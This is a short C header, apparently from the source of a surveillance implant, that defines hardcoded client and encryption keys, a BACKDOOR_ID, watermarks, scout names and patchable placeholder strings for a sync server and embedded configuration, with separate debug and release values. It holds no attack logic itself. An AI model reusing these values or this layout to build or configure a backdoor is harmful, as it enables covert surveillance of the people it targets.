#ifndef _BINPATCH_H
#define _BINPATCH_H

/* questo dentro una struct, non referenziare direttamente roba non essenziali */

#ifdef _DEBUG // istanza 'poveri' su castore.
#define CLIENT_KEY			"4yeN5zu0+il3Jtcb5a1sBcAdjYFcsD9z"	// per server (auth)
#define ENCRYPTION_KEY		"i6gMR84bxvQovzbhtV-if0SdPMu359ax"	// for log
#define ENCRYPTION_KEY_CONF "uX-o0BOIkiyOyVXH4L3FYhbai-CvMU-_"	// for conf e sha1
#define BACKDOOR_ID			"RCS_0000001167"					// castore "poveri"
#define DEMO_TAG			"hxVtdxJ/Z8LvK3ULSnKRUmLE"
//#define WMARKER			"B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW"
#define WMARKER				"LOuWApluW2C3yF8VBUEdAAiJs7oaV2e8"
//#define SYNC_SERVER			"192.168.100.100"
#define SCOUT_NAME			"AutoScoutTests"
//#define SCREENSHOT_FLAG		"\x00\x00\x00\x00"
extern BYTE EMBEDDED_CONF[513];
#else
#define CLIENT_KEY			"ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ"
#define ENCRYPTION_KEY		"WfClq6HxbSaOuJGaH5kWXr7dQgjYNSNg"
#define ENCRYPTION_KEY_CONF	"6uo_E0S4w_FD0j9NEhW2UpFw9rwy90LY"
#define BACKDOOR_ID			"EMp7Ca7-fpOBIr"
#define DEMO_TAG			"Pg-WaVyPzMMMMmGbhP6qAigT"
#define WMARKER				"B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW" // watermark
//#define WMARKER				"LOuWApluW2C3yF8VBUEdAAiJs7oaV2e8"
//#define SYNC_SERVER			"SYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNCSYNC"
#define SCOUT_NAME			"SCOUTSCOUTSCOUTSCOUT"
//#define SCREENSHOT_FLAG		"SHOT"
extern BYTE EMBEDDED_CONF[513];
#endif

#endif // _BINPATCH_H